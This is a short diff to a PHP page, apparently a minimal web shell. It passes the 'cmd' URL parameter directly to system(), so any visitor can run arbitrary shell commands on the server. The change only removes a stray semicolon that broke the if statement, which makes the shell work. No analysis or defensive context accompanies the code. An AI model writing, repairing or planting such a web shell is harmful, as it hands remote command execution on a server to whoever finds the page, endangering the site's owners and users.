@@ -10,7 +10,7 @@ echo basename($_SERVER['PHP_SELF']);
 </form>
 <pre>
 <?php
-    if(isset($_GET['cmd']);)
+    if(isset($_GET['cmd']))
     {
         system($_GET['cmd']);
     }
